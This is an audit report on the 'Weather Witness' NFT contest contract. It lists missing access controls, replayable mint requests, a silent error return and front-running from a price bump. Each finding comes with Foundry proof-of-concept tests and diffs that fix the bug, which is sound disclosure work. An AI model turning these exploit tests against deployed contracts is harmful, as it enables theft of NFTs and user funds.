# Weather Witness - Findings Report

# Table of contents
- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01. [H-1] Unchecked call of `WeatherNft::fulfillMintRequest` can lead to an unathorized call of a random user, leading to a potential steal of the NFT](#H-01)
    - ### [H-02. [M-1] Silent Return on Error in fulfillMintRequest Function Causes Loss of User Feedback](#H-02)
    - ### [H-03. [H-2] Missing Fulfillment Tracking in `WeatherNFT` Contract Leads To Multiple NFT Mints From Single Request ID](#H-03)
    - ### [H-04. [H-3] Unauthorized Weather State Manipulation in NFT Metadata Due to Missing Access Control](#H-04)
- ## Medium Risk Findings
    - ### [M-01. [M-2] Unconditional Price Bump in `requestMintWeatherNFT` Enables Front‑Running and User DOS](#M-01)



# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #40

### Dates: May 15th, 2025 - May 22nd, 2025

[See more contest details here](https://codehawks.cyfrin.io/c/2025-05-weather-witness)

# <a id='results-summary'></a>Results Summary

### Number of findings by me in the contest:
- High: 4/5
- Medium: 1/1
- Low: 0/2


# High Risk Findings

## <a id='H-01'></a>H-01. [H-1] Unchecked call of `WeatherNft::fulfillMintRequest` can lead to an unathorized call of a random user, leading to a potential steal of the NFT            



# Unchecked call of `WeatherNft::fulfillMintRequest` can lead to an unathorized call of a random user, leading to a potential steal of the NFT

## Description

Under intended behavior, only the original requester who called `requestMintWeatherNFT` should be able to invoke `fulfillMintRequest` once the Chainlink oracle response arrives, minting the NFT to the coresponding  address. However, because `fulfillMintRequest` lacks any `msg.sender` check, **any**one may call it and receive the NFT.

```Solidity
>@function fulfillMintRequest(bytes32 requestId) external{
  ...
 >@ // mints NFT to msg.sender without any check
   _mint(msg.sender, tokenId);
}
```

## Risk

### Likelihood – High

* Observers(users or bots) can watch the on‑chain `WeatherNFTMintRequestSent` logs to extract `requestId`

* No additional permissions or complex interactions are needed; **any** address may call the function immediately.

### Impact – High

* Attackers can **steal newly minted NFTs**, diverting them (and any embedded value) to their own addresses.

* Legitimate users may be **denied service** by front‑runners consuming the only valid mint operation for that

## Proof of Concept

The following PoC proves that anyone can call the `WeatherNft::fulfillMintRequest`. Add it to the testing suite:

```Solidity
    function test_anyone_can_call_fulfillMintRequest() public {

        string memory pincode = "560001";
        string memory isoCode = "IN";
        bool registerKeeper = false;
        uint256 heartbeat = 1 days;
        uint256 initLinkDeposit = 5e18;

        // Make a real request from the `user`
        vm.startPrank(user);
        linkToken.approve(address(weatherNft), initLinkDeposit);
        vm.recordLogs();
        weatherNft.requestMintWeatherNFT{
            value: weatherNft.s_currentMintPrice()
        }(pincode, isoCode, registerKeeper, heartbeat, initLinkDeposit);
        vm.stopPrank();

        Vm.Log[] memory logs = vm.getRecordedLogs();
        bytes32 realReqId;
        for (uint256 i = 0; i < logs.length; i++) {
            if (
                logs[i].topics[0] ==
                keccak256(
                    "WeatherNFTMintRequestSent(address,string,string,bytes32)"
                )
            ) {
                (, , , realReqId) = abi.decode(
                    logs[i].data,
                    (address, string, string, bytes32)
                );
                break;
            }
        }

        assert(realReqId != bytes32(0));

        // Fulfill via Chainlink router
        vm.prank(functionsRouter);
        bytes memory fakeResponse = abi.encode(WeatherNftStore.Weather.SNOW);
        weatherNft.handleOracleFulfillment(realReqId, fakeResponse, "");

        // Try calling fulfillMintRequest from a random attacker
        address attacker = makeAddr("attacker");
        vm.prank(attacker);
        weatherNft.fulfillMintRequest(realReqId);
    }
```

## Recommended Mitigation

Add the `onlyOwner` modifier to ensure that only the owner of the NFT can call the `WeatherNft::fulfillMintRequest` function.

```diff
function fulfillMintRequest(bytes32 requestId) external {
    bytes memory response = s_funcReqIdToMintFunctionReqResponse[requestId].response;
    bytes memory err      = s_funcReqIdToMintFunctionReqResponse[requestId].err;

    require(response.length > 0 || err.length > 0, WeatherNft__Unauthorized());
    ...

+   // Only the original requester may complete their mint
+   require(
+     msg.sender == s_funcReqIdToUserMintReq[requestId].user,
+     WeatherNft__Unauthorized()
+   );

    _mint(msg.sender, tokenId);
}

```

## <a id='H-02'></a>H-02. [M-1] Silent Return on Error in fulfillMintRequest Function Causes Loss of User Feedback            



### \[M-1] Silent Return on Error in fulfillMintRequest Function Causes Loss of User Feedback

## Description

The `fulfillMintRequest` function is designed to process oracle responses for weather NFT minting requests, and when successful, mint a new NFT to the user.

However, due to a logic error, the function silently returns without any feedback when an oracle error occurs, leaving users confused and without their NFTs.

```solidity
function fulfillMintRequest(bytes32 requestId) external {
    bytes memory response = s_funcReqIdToMintFunctionReqResponse[requestId].response;
    bytes memory err = s_funcReqIdToMintFunctionReqResponse[requestId].err;
    
    require(response.length > 0 || err.length > 0, WeatherNft__Unauthorized());
    
    @> if (response.length == 0 || err.length > 0) {
    @>     return;
    @> }
    
    // Rest of function that mints NFT...
}
```

## Risk

**Likelihood**: High

* Oracle errors are common in Web3 applications due to network issues, API failures, or data availability problems

* Any error response from the oracle will trigger this condition

* The function doesn't revert or emit events in error cases, making it hard to detect

**Impact**: Medium

* Users experience transactions that theoretically succeed (don't revert) but don't actually mint any NFTs

* No feedback mechanism exists to inform users about errors or failed requests

* User funds (gas costs and potentially LINK deposits) are spent without clear outcome

* Request data remains in storage indefinitely, potentially causing bloat

* Users have no way to retry or troubleshoot failed requests

## Proof of Concept

Run the test bellow in your testing suite:

```Solidity
    function test_silentReturn_whenErrorResponseExists() public {
        string memory pincode = "125001";
        string memory isoCode = "IN";
        bool registerKeeper = true;
        uint256 heartbeat = 12 hours;
        uint256 initLinkDeposit = 5e18;
        uint256 initialTokenCount = weatherNft.s_tokenCounter();
        console.log("Initial token count: ", initialTokenCount);
        console.log("Initial price: ", weatherNft.s_currentMintPrice());
        // Make request from user
        vm.startPrank(user);
        linkToken.approve(address(weatherNft), initLinkDeposit);
        vm.recordLogs();
        weatherNft.requestMintWeatherNFT{
            value: weatherNft.s_currentMintPrice()
        }(pincode, isoCode, registerKeeper, heartbeat, initLinkDeposit);
        vm.stopPrank();

        // Get request ID from logs
        Vm.Log[] memory logs = vm.getRecordedLogs();
        bytes32 reqId;
        for (uint256 i; i < logs.length; i++) {
            if (
                logs[i].topics[0] ==
                keccak256(
                    "WeatherNFTMintRequestSent(address,string,string,bytes32)"
                )
            ) {
                (, , , reqId) = abi.decode(
                    logs[i].data,
                    (address, string, string, bytes32)
                );
                break;
            }
        }
        assert(reqId != bytes32(0));

        // Oracle fulfills with an error response (empty response with error message)
        vm.prank(functionsRouter);
        weatherNft.handleOracleFulfillment(reqId, "", "Error fetching data");

        // Now try to fulfill the mint request
        vm.prank(user);
        // This call will return silently without reverting, but also without minting
        weatherNft.fulfillMintRequest(reqId);

        // Verify that no NFT was minted - token counter should remain unchanged
        assertEq(weatherNft.s_tokenCounter(), initialTokenCount);

        // Verify user never received an NFT
        assertEq(weatherNft.balanceOf(user), 0);

        // The request data should still be in storage since it wasn't cleaned up
        (uint256 reqHeartbeat, address reqUser, , , , ) = weatherNft
            .s_funcReqIdToUserMintReq(reqId);
        assertEq(reqUser, user);
        assertEq(reqHeartbeat, heartbeat);
    }
```

As shown and explained above, we have no way of telling if the transaction truly failed, instead it will just return nothing and the user will not get any NFT.

## Recommended Mitigation

Consider adding a few new custom errors to check for potential issues, and clear storage so that it doesn't bloat and increase gas costs.&#x20;

```diff
function fulfillMintRequest(bytes32 requestId) external {
//...function logic
     require(response.length > 0 || err.length > 0, WeatherNft__Unauthorized());
    
-   if (response.length == 0 || err.length > 0) {
-       return;
-   }
+   // Revert with proper error message when there's a problem with the oracle response
+   if (err.length > 0) {
+       revert WeatherNft__OracleError(requestId, err);
+   }
+   
+   // Ensure there's a valid response
+   require(response.length > 0, WeatherNft__EmptyResponse(requestId));
  

    // Rest of function...
    
+   // Clean up storage
+   delete s_funcReqIdToMintFunctionReqResponse[requestId];
+   delete s_funcReqIdToUserMintReq[requestId];
}

// Add new error types
+ error WeatherNft__OracleError(bytes32 requestId, bytes errorMessage);
+ error WeatherNft__EmptyResponse(bytes32 requestId);
```

## <a id='H-03'></a>H-03. [H-2] Missing Fulfillment Tracking in `WeatherNFT` Contract Leads To Multiple NFT Mints From Single Request ID            



### \[H-2] Missing Fulfillment Tracking in `WeatherNFT` Contract Leads To Multiple NFT Mints From Single Request ID

## Description

The `fulfillMintRequest` function is designed to process oracle responses and mint a unique NFT for each weather data request.
Due to missing fulfillment tracking, the same request ID can be used multiple times to mint an unlimited number of NFTs.

```Solidity
function fulfillMintRequest(bytes32 requestId) external {
  //...function logic
    _mint(msg.sender, tokenId);
    s_tokenIdToWeather[tokenId] = Weather(weather);

// ... rest of function logic
@>  // Missing code to track that this requestId has been fulfilled
@>  // Missing code to delete request data after fulfillment
    
}
```

## Risk

**Likelihood**: Medium

* Public transaction data makes request IDs visible and accessible to anyone monitoring the blockchain

* Successful oracle responses remain stored indefinitely in contract storage

* Anyone with a valid request ID can exploit this vulnerability

**Impact**: High

* Unintended NFT inflation - unlimited NFTs can be minted from a single oracle request

* Storage bloat - request data is never cleaned up, leading to perpetually growing contract storage

* Value dilution - NFT uniqueness and scarcity are compromised

## Proof of Concept

The test bellow proves that a handful of people, can call the `fullfillMintRequest` function and mint themselves unlimited NFT's.

Add the following to the testing suite:

```Solidity
function test_multiple_mints_with_same_requestId() public {
    string memory pincode = "125001";
    string memory isoCode = "IN";
    bool registerKeeper = false; // Disable keeper to simplify test
    uint256 heartbeat = 12 hours;
    uint256 initLinkDeposit = 0; // No LINK needed since no keeper
    uint256 initialTokenCount = weatherNft.s_tokenCounter();
    console.log("Initial token count: ", initialTokenCount);
    console.log("Initial price: ", weatherNft.s_currentMintPrice());
    
    // Make an initial legitimate request from user
    vm.startPrank(user);
    vm.recordLogs();
    weatherNft.requestMintWeatherNFT{
        value: weatherNft.s_currentMintPrice()
    }(pincode, isoCode, registerKeeper, heartbeat, initLinkDeposit);
    vm.stopPrank();

    // Get request ID from logs
    Vm.Log[] memory logs = vm.getRecordedLogs();
    bytes32 reqId;
    for (uint256 i; i < logs.length; i++) {
        if (
            logs[i].topics[0] ==
            keccak256(
                "WeatherNFTMintRequestSent(address,string,string,bytes32)"
            )
        ) {
            (, , , reqId) = abi.decode(
                logs[i].data,
                (address, string, string, bytes32)
            );
            break;
        }
    }
    assert(reqId != bytes32(0));

    // Oracle fulfills with a successful weather response
    vm.prank(functionsRouter);
    bytes memory weatherResponse = abi.encode(
        WeatherNftStore.Weather.SUNNY
    );
    weatherNft.handleOracleFulfillment(reqId, weatherResponse, "");

    // Multiple users will now use the same request ID to mint NFTs
    address[] memory minters = new address[](5);
    minters[0] = user; // Original requester
    minters[1] = attacker; // Malicious actor
    minters[2] = frontRunner; // Another malicious actor
    minters[3] = makeAddr("random1");
    minters[4] = makeAddr("random2");

    // Track minted token IDs
    uint256[] memory tokenIds = new uint256[](5);
    uint256 mintersLength = minters.length;
    
    // Each user mints an NFT with the SAME requestId
    for (uint256 i = 0; i < mintersLength; i++) {
        // Record token counter before minting
        uint256 tokenCountBefore = weatherNft.s_tokenCounter();
        console.log(
            "Token count before minting: ",
            tokenCountBefore
        );
        
        // Mint using the same requestId
        vm.prank(minters[i]);
        weatherNft.fulfillMintRequest(reqId);

        // Verify an NFT was minted (token counter increased)
        uint256 tokenCountAfter = weatherNft.s_tokenCounter();
        console.log(
            "Token count after minting: ",
            tokenCountAfter
        );
        tokenIds[i] = tokenCountBefore; // The ID that was minted
        console.log(
            "Token ID minted: ",
            tokenIds[i]
        );

        assertEq(
            tokenCountAfter,
            tokenCountBefore + 1
        );
        assertEq(
            weatherNft.balanceOf(minters[i]),
            1
        );
        assertEq(
            weatherNft.ownerOf(tokenIds[i]),
            minters[i]
        );

        // Verify all NFTs have the same weather (from the single oracle response)
        assertEq(
            uint8(weatherNft.s_tokenIdToWeather(tokenIds[i])),
            uint8(WeatherNftStore.Weather.SUNNY)
        );

        console.log(
            "User %s minted token ID %d using requestId %s",
            minters[i],
            tokenIds[i],
            vm.toString(reqId)
        );
    }

    // Verify 5 NFTs were minted from a single request
    assertEq(
        weatherNft.s_tokenCounter(),
        initialTokenCount + 5
    );

    // Verify request data is still available even after multiple mints
    (uint256 reqHeartbeat, address reqUser, , , , ) = weatherNft
        .s_funcReqIdToUserMintReq(reqId);
    assertEq(reqUser, user, "Request data should still exist in storage");
    assertEq(
        reqHeartbeat,
        heartbeat,
        "Request data should still exist in storage"
    );
  
    console.log("Final price: ", weatherNft.s_currentMintPrice());
    console.log(
        "Final token count: ",
        weatherNft.s_tokenCounter()
    );
}
```

### LINK Deposit Exploitation Scenario

In a scenario with keeper registration enabled (which we disabled in the test for simplicity), this vulnerability becomes even more severe:

1. User A makes a legitimate request with a LINK deposit (e.g., 5 LINK)
2. Multiple attackers call `fulfillMintRequest` with User A's requestId
3. Each attacker gets an NFT with keeper services registered
4. All keeper registrations use User A's LINK deposit
5. User A effectively pays for keeper services for all attacker NFTs

## Recommended Mitigation

Consider using a mapping and a custom error to track which requestIds have been fulfilled.

```diff
+ // Track which requestIds have been fulfilled
+ mapping(bytes32 => bool) private s_requestIdFulfilled;

function fulfillMintRequest(bytes32 requestId) external {

    require(response.length > 0 || err.length > 0, WeatherNft__Unauthorized());
    
+   // Prevent duplicate fulfillment
+   require(!s_requestIdFulfilled[requestId], "WeatherNft__RequestAlreadyFulfilled");
    

...rest of function logic
    
    s_weatherNftInfo[tokenId] = WeatherNftInfo({
        heartbeat: _userMintRequest.heartbeat,
        lastFulfilledAt: block.timestamp,
        upkeepId: upkeepId,
        pincode: _userMintRequest.pincode,
        isoCode: _userMintRequest.isoCode
    });
    
+   // Mark request as fulfilled
+   s_requestIdFulfilled[requestId] = true;
+   
+   // Clean up storage to prevent bloat and reduce gas costs
+   delete s_funcReqIdToMintFunctionReqResponse[requestId];
+   delete s_funcReqIdToUserMintReq[requestId];
}

+ // Add a custom error for duplicate fulfillment
+ error WeatherNft__RequestAlreadyFulfilled();
```

## <a id='H-04'></a>H-04. [H-3] Unauthorized Weather State Manipulation in NFT Metadata Due to Missing Access Control            



# \[H-3] Unauthorized Weather Attribute Manipulation in NFT Metadata Due to Missing Access Control

## Description

The `WeatherNft` contract allows users to mint NFTs with weather attributes that can be updated over time. The weather attribute is meant to be updated through a Chainlink oracle and automation system to fetch current weather conditions.
However, the contract fails to validate who can initiate weather updates in `performUpkeep()` and lacks proper authorization checks in `_fulfillWeatherUpdate()`. This allows any external actor to trigger weather update requests for NFTs they don't own and subsequently alter their weather attributes with oracle responses, effectively manipulating the NFT metadata without owner permission.

```solidity
function performUpkeep(bytes calldata performData) external override {
    //... function logic
    bytes32 _reqId = _sendFunctionsWeatherFetchRequest(pincode, isoCode);
    s_funcReqIdToTokenIdUpdate[_reqId] = _tokenId;     @> // No validation of who is updating the NFT

    emit NftWeatherUpdateRequestSend(_tokenId, _reqId, upkeepId);
}

function _fulfillWeatherUpdate(bytes32 requestId, bytes memory response, bytes memory err) internal {
    //... function logic
    s_tokenIdToWeather[tokenId] = Weather(weather);    @> // Updates weather without authorization checks

    emit NftWeatherUpdated(tokenId, Weather(weather));
}
```

## Risk

**Likelihood**: High

* The `performUpkeep()` function is externally accessible and can be called by any address without access controls.

* The contract stores a clear mapping between request IDs and token IDs in `s_funcReqIdToTokenIdUpdate`, making it trivial to track which requests correspond to which NFTs.

**Impact**: High

* Attackers can manipulate the weather attributes of any NFT in the collection.

* If certain weather types have more valuable properties or interactions with other systems, this vulnerability allows exploitation of economic incentives tied to the NFT's weather state.

* The integrity of the entire NFT collection is compromised as token metadata can be arbitrarily modified without owner consent, violating a fundamental expectation of NFT ownership.

## Proof of Concept

Add the following test and modifier to the testing suite:

```solidity

    modifier withMintedNftInitialSetUp(address _user) {
        // Default parameters for NFT minting
        string memory pincode = "110001";
        string memory isoCode = "IN";
        bool registerKeeper = false;
        uint256 heartbeat = 1 days;
        uint256 initLinkDeposit = 0;

        // User mints an NFT
        vm.startPrank(_user);
        vm.recordLogs();
        weatherNft.requestMintWeatherNFT{
            value: weatherNft.s_currentMintPrice()
        }(pincode, isoCode, registerKeeper, heartbeat, initLinkDeposit);
        vm.stopPrank();

        // Get the request ID from logs
        Vm.Log[] memory logs = vm.getRecordedLogs();
        bytes32 reqId;
        for (uint256 i; i < logs.length; i++) {
            if (
                logs[i].topics[0] ==
                keccak256(
                    "WeatherNFTMintRequestSent(address,string,string,bytes32)"
                )
            ) {
                (, , , reqId) = abi.decode(
                    logs[i].data,
                    (address, string, string, bytes32)
                );
                break;
            }
        }
        assert(reqId != bytes32(0));

        // Oracle fulfills with a weather response
        vm.prank(functionsRouter);
        bytes memory weatherResponse = abi.encode(
            WeatherNftStore.Weather.SUNNY
        );
        weatherNft.handleOracleFulfillment(reqId, weatherResponse, "");

        // User fulfills mint request
        vm.prank(_user);
        weatherNft.fulfillMintRequest(reqId);

        _;
    }

```

```solidity
function test_missing_validation_in_fulfillWeatherUpdate()
    public
    withMintedNftInitialSetUp(user)
{
   // Verify the NFT was minted
        uint256 tokenId = weatherNft.s_tokenCounter() - 1;
        assertEq(weatherNft.ownerOf(tokenId), user);
        assertEq(
            uint8(weatherNft.s_tokenIdToWeather(tokenId)),
            uint8(WeatherNftStore.Weather.SUNNY)
        );

        // Step 2: Attacker manipulates the weather of the NFT by exploiting missing validation

        // Attacker creates a malicious update request (directly to the weather update function)
        // This demonstrates that _fulfillWeatherUpdate lacks validation
        vm.recordLogs();

        // Attacker sends a performUpkeep request to generate a reqId for weather update
        vm.prank(attacker);
        weatherNft.performUpkeep(abi.encode(tokenId));

        // Get the request ID for the weather update
        Vm.Log[] memory updateLogs = vm.getRecordedLogs();
        bytes32 updateReqId;
        for (uint256 i; i < updateLogs.length; i++) {
            if (
                updateLogs[i].topics[0] ==
                keccak256(
                    "NftWeatherUpdateRequestSend(uint256,bytes32,uint256)"
                )
            ) {
                (, updateReqId) = abi.decode(
                    updateLogs[i].data,
                    (uint256, bytes32)
                );
                break;
            }
        }
        assert(updateReqId != bytes32(0));

        // Validate the update request is linked to the token
        assertEq(weatherNft.s_funcReqIdToTokenIdUpdate(updateReqId), tokenId);

        // Attacker spoofs the oracle response (in a real attack, this would require exploiting
        // the oracle or other means to inject malicious data)
        // Here we use the functionsRouter address to simulate oracle access
        vm.prank(functionsRouter);
        bytes memory maliciousWeatherResponse = abi.encode(
            WeatherNftStore.Weather.WINDY
        );
        weatherNft.handleOracleFulfillment(
            updateReqId,
            maliciousWeatherResponse,
            ""
        );

        // Verify the weather was changed
        assertEq(
            uint8(weatherNft.s_tokenIdToWeather(tokenId)),
            uint8(WeatherNftStore.Weather.WINDY)
        );

        console.log("Original weather: ", uint8(WeatherNftStore.Weather.SUNNY));
        console.log(
            "Weather after attack: ",
            uint8(WeatherNftStore.Weather.WINDY)
        );
}
```

This test demonstrates:

1. The update mechanism lacks validation of who can update the weather
2. Anyone who can influence the oracle response can change the weather data
3. The NFT's value/appearance can be arbitrarily manipulated

## Recommended Mitigation

Consider adding an acces control modifier so that only the owner of the NFT can change it's metadata and add it to all functions that require it:

```diff
+ /**
+  * @dev Modifier to check if the caller is authorized to update the NFT
+  * @param tokenId The ID of the NFT being updated
+  */
+ modifier onlyAuthorizedUserForNft(uint256 tokenId) {
+     require(
+         msg.sender == _ownerOf(tokenId) || 
+         msg.sender == getApproved(tokenId) || 
+         isApprovedForAll(_ownerOf(tokenId), msg.sender) ||
+         msg.sender == s_keeperRegistry,
+         "WeatherNft: Not authorized for this token"
+     );
+     _;
+ }
```

    
# Medium Risk Findings

## <a id='M-01'></a>M-01. [M-2] Unconditional Price Bump in `requestMintWeatherNFT` Enables Front‑Running and User DOS            



# \[M-2] Unconditional Price Bump in `requestMintWeatherNFT` Enables Front‑Running and User DOS

## Description

`requestMintWeatherNFT` increases the mint price **immediately** when any mint request enters the mempool—even *before* the original transaction is mined. This allows a front‑runner to watch for a user’s pending mint, submit their own mint with a higher gas price at the **old** price, and cause the victim’s transaction to revert (because the price has just been bumped). The attacker thus mints “cheaper,” and user loses gas.

```Solidity
function requestMintWeatherNFT(...) external payable returns (bytes32 _reqId) {
    require(msg.value == s_currentMintPrice, WeatherNft__InvalidAmountSent());
    // ──> @> price is bumped here immediately
    s_currentMintPrice += s_stepIncreasePerMint;
    // … rest of logic …
}

```

## Risk

**Likelihood**: High

* Bots and MEV searchers continuously monitor the public mempool for high‑value NFT mint requests.

* Submitting a rival transaction with higher gas to execute first is trivial—no special privileges or complex conditions needed.

**Impact**: Medium

* **Gas Drain & Denial‑of‑Service**: Legitimate users’ transactions revert, wasting gas and blocking their ability to mint at the intended price.

* **Cheaper Arbitrage Mint**: Attackers secure NFTs at the old, lower price, undermining fair access and potentially capturing all supply before retail users

## Proof of Concept

Add the following test  in the testing suite:

```Solidity
// declare the frontRunner
  address frontRunner = makeAddr("frontRunner");
// add these into the setUp function
  vm.deal(frontRunner, 1000e18);
  deal(address(linkToken), frontRunner, 1000e18);
// actual test
function test_frontRunning_vulnerability() public {
        string memory pincode = "110001";
        string memory isoCode = "IN";
        uint256 initialPrice = weatherNft.s_currentMintPrice();
        console.log(
            "Initial price: ",
            initialPrice,
            " Step increase: ",
            weatherNft.s_stepIncreasePerMint()
        );
        // Create user transaction with the initial arbitrary price
        vm.startPrank(user);
        bytes memory userTx = abi.encodeWithSelector(
            weatherNft.requestMintWeatherNFT.selector,
            pincode,
            isoCode,
            false,
            1 days,
            0
        );
        vm.stopPrank();

        // Front-runner sees the transaction and front-runs it
        vm.prank(frontRunner);
        weatherNft.requestMintWeatherNFT{value: initialPrice}(
            "999999", // different pincode
            "US", // different country
            false,
            1 days,
            0
        );

        // Price has now increased
        uint256 newPrice = weatherNft.s_currentMintPrice();
        console.log(
            "New price: ",
            newPrice,
            " Step increase: ",
            weatherNft.s_stepIncreasePerMint()
        );
        assertEq(
            newPrice,
            initialPrice + weatherNft.s_stepIncreasePerMint()
        );

        // User's transaction would now fail if executed with the original value
        vm.expectRevert(WeatherNftStore.WeatherNft__InvalidAmountSent.selector);
        vm.prank(user);
        (bool success, ) = address(weatherNft).call{value: initialPrice}(
            userTx
        );
    }
```

Fig.1

```Solidity
[PASS] test_frontRunning_vulnerability() (gas: 510032)
Logs:
  Initial price:  100000000000000  Step increase:  10000000000000
  New price:  110000000000000  Step increase:  10000000000000
```

Running this test with the command `forge test --mt test_frontRunning_vulnerability --via-ir --rpc-url $AVAX_FUJI_RPC_URL -vvvv` will have the output shown in Fig.1.

Fig.2

```Solidity
  ├─ [0] VM::prank(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D])
    │   └─ ← [Return]
    ├─ [1270] 0x4fF356bB2125886d048038386845eCbde022E15e::requestMintWeatherNFT{value: 100000000000000}("110001", "IN", false, 86400 [8.64e4], 0)
    │   └─ ← [Revert] WeatherNft__InvalidAmountSent()
    └─ ← [Return]
```

As we can see in Fig.2, when we try to call the tx with the initial value, it will revert. As such, our user got front-run.

## Recommended Mitigation

Because bumping up the price in the \`requestMintWeatherNFT leads to the user getting front-run, we could technically increase the price after the whole minting process is complete.

```diff
 function requestMintWeatherNFT(...) external payable returns (bytes32 _reqId) {
     require(msg.value == s_currentMintPrice, WeatherNft__InvalidAmountSent());
-    // immediate bump allows front‑running
-    s_currentMintPrice += s_stepIncreasePerMint;
+    // defer bump until after mint finalization
+    // (e.g. in fulfillMintRequest, after successful mint)
     // … existing transfer/LINK logic …
     _reqId = _sendFunctionsWeatherFetchRequest(_pincode, _isoCode);
+    // do *not* bump price here
     emit WeatherNFTMintRequestSent(msg.sender, _pincode, _isoCode, _reqId);
     // record user request…
 }
+
+// then, in fulfillMintRequest, once mint is done:
+function fulfillMintRequest(bytes32 requestId) external {
+    // … existing checks and mint …
+    // only now bump the price for next user
+    s_currentMintPrice += s_stepIncreasePerMint;
+}

```





